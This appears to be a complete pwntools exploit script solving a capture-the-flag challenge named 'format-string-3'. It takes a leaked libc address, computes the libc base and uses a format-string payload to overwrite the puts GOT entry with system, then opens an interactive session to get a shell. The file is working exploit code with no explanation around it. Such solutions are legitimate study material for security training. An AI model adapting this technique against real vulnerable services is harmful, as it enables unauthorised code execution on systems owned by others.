from pwn import *

libc = ELF("./libc.so.6")

setvbuf_offset = libc.symbols["setvbuf"]
execve_offset = 0xda9f0
system_offset = libc.symbols["system"]
puts_got = 0x404018

r = process("./format-string-3")
r.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
res = r.recvline()

setvbuf_address = int(res[:-1].decode(), base=16)
print(setvbuf_address)
print(res)
print(res.decode("utf-8").rstrip())
print(res.decode("utf-8").rstrip()[2:])

libc_base = setvbuf_address - setvbuf_offset
system_address = libc_base + system_offset

# payload = f"%{system_address}c%41$n".encode()

payload = fmtstr_payload(38, {puts_got: p64(system_address)})
print(payload, len(payload))

r.sendline(payload)
r.interactive()
